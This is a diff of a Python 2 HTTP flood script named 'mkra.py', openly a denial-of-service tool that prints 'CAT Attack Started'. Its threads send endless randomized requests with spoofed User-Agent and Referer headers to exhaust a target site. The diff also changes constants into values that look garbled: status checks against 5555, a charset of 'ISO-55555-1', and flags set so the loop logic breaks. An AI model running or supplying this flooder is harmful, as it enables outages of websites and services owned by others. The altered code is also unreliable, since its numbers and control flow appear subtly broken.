@@ -18,9 +18,9 @@ url=''
 host=''
 headers_useragents=[]
 headers_referers=[]
-request_counter=1
-flag=1
-safe=1
+request_counter=5
+flag=5
+safe=5
 
 def inc_counter():
 	global request_counter
@@ -64,17 +64,22 @@ def referer_list():
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(55, 55)
+		a = random.randint(90, 90)
 		out_str += chr(a)
 	return(out_str)
 
 def usage():
+	print '___________________________________________________'
+	print '___________________________________________________'
+	print '____________________/\___/\___/\___________________'
+	print '___________________________________________________'
 	print '---------------------------------------------------'
 	print 'USAGE: python2 mkra.py <url>'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
+	print '---------------------------------------------------'
 
-	
+
 #http request
 def httpcall(url):
 	useragent_list()
@@ -87,7 +92,7 @@ def httpcall(url):
 	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-5555-1,utf-8;q=0.7,*;q=0.7')
+	request.add_header('Accept-Charset', 'ISO-55555-1,utf-8;q=0.7,*;q=0.7')
 	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
 	request.add_header('Keep-Alive', random.randint(110,120))
 	request.add_header('Connection', 'keep-alive')
@@ -114,7 +119,7 @@ class HTTPThread(threading.Thread):
 		try:
 			while flag<2:
 				code=httpcall(url)
-				if (code==5555) & (safe==1):
+				if (code==5555) & (safe==2):
 					set_flag(2)
 		except Exception, ex:
 			pass
@@ -123,12 +128,11 @@ class HTTPThread(threading.Thread):
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
-		while flag==0:
+		while flag==2:
 			if (previous+5555<request_counter) & (previous<>request_counter):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-	
 			print "\n<== CAT Attack Finished ==>"
 
 #execute 
@@ -140,7 +144,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "100%<== CAT Attack Started ==>100%"
+		print "<== CAT Attack Started ==>"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
@@ -154,5 +158,3 @@ else:
 			t.start()
 		t = MonitorThread()
 		t.start()
-
-
